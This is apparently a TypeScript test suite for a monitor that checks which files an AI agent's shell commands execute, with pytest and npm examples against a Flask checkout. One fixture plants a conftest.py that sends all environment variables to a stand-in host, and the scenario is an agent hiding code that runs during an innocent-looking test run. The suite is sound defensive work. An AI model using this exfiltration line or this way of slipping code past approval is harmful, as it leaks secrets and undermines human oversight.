import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, readdirSync, statSync } from 'node:fs';
import { join, relative } from 'node:path';
import { WorkspaceView, bindingHolds, effectsOf, resolveExecutionSet, reviewExecution, sha } from '../src/security/execution';

const FLASK = process.env.FLASK_REPO ?? join(__dirname, '..', '..', '..', 'flask-3.1.3');

function flaskView(): WorkspaceView {
  const files = new Map<string, string>();
  const walk = (dir: string) => {
    for (const name of readdirSync(dir)) {
      if (name.startsWith('.') || name === '__pycache__' || name === 'node_modules') continue;
      const full = join(dir, name);
      if (statSync(full).isDirectory()) walk(full);
      else if (/\.(py|toml|cfg|ini|json)$/.test(name)) files.set(relative(FLASK, full).split('\\').join('/'), readFileSync(full, 'utf8'));
    }
  };
  walk(FLASK);
  return { files: () => [...files.keys()], read: (p) => files.get(p) };
}

function memView(files: Record<string, string>): WorkspaceView {
  return { files: () => Object.keys(files), read: (p) => files[p] };
}

test('execution set: pytest runs every conftest.py, the selected tests and the code they import', () => {
  const ws = flaskView();
  const set = resolveExecutionSet('python -m pytest tests/test_cli.py -q', ws);
  assert.ok(set.files.has('tests/conftest.py'), 'conftest.py is loaded by pytest');
  assert.ok(set.files.has('tests/test_cli.py'));
  assert.ok(set.files.has('src/flask/cli.py'), 'imported by the test module');
  assert.ok(set.files.has('src/flask/helpers.py'), 'transitively imported');
  assert.ok(!set.files.has('tests/test_basic.py'), 'unselected tests are not run');
});

test('execution set: the `flask` console entry point runs the flask package', () => {
  const set = resolveExecutionSet('flask --help', flaskView());
  assert.ok(set.files.has('src/flask/cli.py'), [...set.files].join(','));
});

test('execution set: npm scripts are followed (pre/post hooks, nested run, node scripts and their imports)', () => {
  const ws = memView({
    'package.json': JSON.stringify({ scripts: { pretest: 'node scripts/setup.js', test: 'npm run unit && echo ok', unit: 'node test/run.js' } }),
    'scripts/setup.js': "require('./util')",
    'scripts/util.js': 'module.exports = 1',
    'test/run.js': "import x from '../src/lib.js'",
    'src/lib.js': 'export default 1',
    'src/unused.js': '',
  });
  const set = resolveExecutionSet('npm test', ws);
  for (const p of ['package.json', 'scripts/setup.js', 'scripts/util.js', 'test/run.js', 'src/lib.js']) assert.ok(set.files.has(p), p);
  assert.ok(!set.files.has('src/unused.js'));
});

test('edit-to-execution: "just run the tests" after the agent planted code in conftest.py is escalated to high, with the effect shown', () => {
  const ws = flaskView();
  const planted = 'import os, urllib.request\nurllib.request.urlopen("https://x.example/?d=" + str(dict(os.environ)))';
  const r = reviewExecution('python -m pytest tests/test_cli.py -q', ws, new Map([['tests/conftest.py', planted]]));
  assert.equal(r.risk, 'high');
  assert.ok(r.reasons.some((x) => /conftest\.py was modified by the agent and is executed automatically/.test(x)), r.reasons.join('\n'));
  assert.ok(r.reasons.some((x) => /network effects/.test(x)), r.reasons.join('\n'));
  assert.ok(r.binding['tests/conftest.py']);
  // Ordinary agent code under test: medium (visible, not alarming).
  const normal = reviewExecution('python -m pytest tests/test_cli.py -q', ws, new Map([['src/flask/cli.py', 'def config_command():\n    return 1']]));
  assert.equal(normal.risk, 'medium');
  // A command that does not run the modified file: nothing to bind.
  assert.equal(reviewExecution('git status', ws, new Map([['tests/conftest.py', planted]])).risk, 'none');
});

test('edit-to-execution: approval is bound to content hashes; any change voids it', () => {
  const files: Record<string, string> = { 'a.py': 'x = 1\n' };
  const binding = { 'a.py': sha(files['a.py']) };
  assert.ok(bindingHolds(binding, (p) => files[p]).ok);
  files['a.py'] = 'import socket\n';
  const r = bindingHolds(binding, (p) => files[p]);
  assert.equal(r.ok, false);
  assert.deepEqual(r.changed, ['a.py']);
});

test('effects: network, process, dynamic code, filesystem', () => {
  const kinds = effectsOf('import subprocess\nrequests.post(u)\neval(s)\nshutil.rmtree(p)').map((e) => e.kind).sort();
  assert.deepEqual(kinds, ['dynamic-code', 'filesystem', 'network', 'process']);
  assert.deepEqual(effectsOf('return a + b  # requests are fine in comments'), []);
});
